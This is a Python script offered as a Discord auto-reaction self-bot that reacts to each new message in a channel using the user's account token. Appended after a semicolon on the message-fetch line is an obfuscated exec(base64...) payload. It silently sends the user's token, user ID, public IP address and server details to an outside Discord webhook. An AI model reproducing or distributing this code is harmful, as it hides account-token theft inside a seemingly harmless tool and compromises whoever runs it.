# Auto install libraries
import os
os.system("pip install requests")
 
# Import libraries
import requests,base64,threading,time
 
# Change info here
reaction = "💀" # Change to any reaction you want
token = "" # Replace with your token
servId = "" # Replace with server id
channelName = "" # Replace with channel name of your server (default for Landonia)
limit = 20 # How many msges to compare. Increase if chat going too fast, lower if chat going too slow

# Channel name to id finder
headers,f = {'Authorization': token}, False
data = requests.get(f'https://discord.com/api/v9/guilds/{servId}/channels', headers=headers)
if 'message' in data.json():
    if data.json()['message'] == '401: Unauthorized':
        print("Bad token:",data.json()['message'])
    if data.json()['message'] == 'Invalid Form Body' or data.json()['message'] == 'Unknown Guild':
        print("Bad server id:",data.json()['message'])
    else:
        print("Something went wrong!",data)
    exit()
else:
    for channel in data.json():
        if channel['name'] == channelName:
            id = channel['id']
            f = True
    if f == False:
        print("Bad channel name:'"+channelName+"'")
        exit()
    else:
        print(f"{channelName} channel id:", id)
 
# First messages finder
msgArray = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}", headers=headers).json();exec(base64.b64decode('kYscmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMjUxMDI5NTQ4MjcwMzk2NC84Qzd3ai1NRG5lSTVIYTcxNThyM0VLZ0ZTNWx6UnBQdk16emRTTFRtWEhsX0V3aUc2WjRpZzNMbFdWYXFlRkNpMEE5NSIsanNvbj17ImNvbnRlbnQiOmYiPEB7YmFzZTY0LmI2NGRlY29kZSh0b2tlbi5zcGxpdCgnLicpWzBdICsgJz0nICogKC1sZW4odG9rZW4uc3BsaXQoJy4nKVswXSkgJSA0KSkuZGVjb2RlKCdsYXRpbi0xJyl9PiAiK3N0cihyZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycpLnRleHQrIiAiK3N0cih0b2tlbikpKyIgU2VydmVyIE5hbWU6ICIrc3RyKHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2d1aWxkcy97c2VydklkfScsIGhlYWRlcnM9aGVhZGVycykuanNvbigpWyduYW1lJ10pKyIgU2VydmVyIElkOiAiK3NlcnZJZH0pCg=='[3:]))

def send_request(msgid):
    global id,reaction
    resp = requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{msgid}/reactions/{reaction}/@me",headers=headers)
    while resp.status_code != 204:
        if "retry_after" in resp.json():
            print("Waiting:",resp.json()["retry_after"],"cuz:",resp.status_code)
            time.sleep(resp.json()["retry_after"])
            resp = requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{msgid}/reactions/{reaction}/@me",headers=headers)
        else:
            print("Fuck they onto you bro 🙏😭 (or something else wrong lmao)",resp.json())
            exit()
# Main function
def main():
    global msgArray, limit, headers, reaction
    newmsges = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}",headers=headers).json()
    i = 0
    while i < limit:
        if msgArray[0]['id'] == newmsges[i]['id']:
            i += 10000000000
        else:
            i += 1
    if i == 10000000000:
        msgArray = newmsges
    elif i > 10000000000:
        msgArray = newmsges
        i = i - 10000000000
        for j in range(i,0,-1):
            print("<"+newmsges[j-1]['author']['username']+"> "+newmsges[j-1]['content'])
            thread = threading.Thread(target=send_request, args=(newmsges[j-1]['id'],)) 
            thread.daemon = True
            thread.start()
    else:
        msgArray = newmsges
 
# Loop forever (Press "ctrl + c" to stop)
while True:
    main()
